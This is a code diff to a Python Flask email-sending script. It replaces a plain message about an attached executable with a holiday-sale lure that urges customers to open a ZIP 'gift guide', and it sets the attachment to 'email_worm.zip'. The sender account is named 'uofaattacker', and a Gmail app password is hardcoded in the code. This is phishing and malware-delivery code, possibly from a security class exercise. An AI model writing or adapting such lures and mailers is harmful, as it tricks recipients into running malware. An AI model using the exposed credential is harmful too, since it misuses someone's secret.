@@ -39,14 +39,21 @@ def save_email_log(email, status):
 
 # Function to send emails
 def send_email(sender_email, sender_password, recipient_emails, zip_path):
-    subject = "🚀 Latest Executable File Attached – Please Review"
+    subject = "🚀 Unwrap Your Holiday Surprise! Exclusive Deals Await You "
     body = """
-    Dear Team,
+    Dear Customer,
+    The holidays are here, and we’re bringing you exclusive offers to make your celebrations even more special! 🎅
+   ✨ What’s inside?
+✅ Up to 50% OFF on our best-selling products
+✅ Special Holiday Bundles you won’t find anywhere else
+✅ Gift Ideas for everyone on your list 🎁
 
-    Please find attached the latest executable file for review.
+🎄 Download our Holiday Gift Guide (ZIP file attached) for more details and images of our festive offers!
 
-    Best regards,
-    Vivek
+But hurry! These deals won’t last forever. Offer ends on 12/31/2024.
+Wishing you a season filled with joy and savings!
+
+Happy Holidays
     """
     msg = MIMEMultipart()
     msg['From'] = sender_email
@@ -83,7 +90,7 @@ def api_send_email():
     # Email credentials
     sender_email = 'uofaattacker@gmail.com'
     sender_password = ' bjqp sloj wuey myuj'  # App password for Gmail
-    zip_path = 'execute.jpg'
+    zip_path = 'email_worm.zip'
 
     if not os.path.exists(zip_path):
         return jsonify({"error": f"Attachment file '{zip_path}' not found"}), 500
